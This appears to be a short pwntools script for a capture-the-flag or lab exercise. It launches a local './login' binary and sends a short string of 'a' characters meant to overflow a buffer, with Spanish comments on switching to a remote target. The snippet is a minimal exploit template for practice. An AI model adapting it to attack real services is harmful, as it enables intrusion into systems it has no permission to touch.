#!/bin/python3
from pwn import *

#Start binary
io = process('./login')    #En caso de ser un servidor remoto sería remote()

#Send string to overflow buffer
io.sendlineafter(b':', b'aaaaaaa')    #Manda la linea despues de detectar el prompt (:)

#Receive output
print(io.recvall().decode())
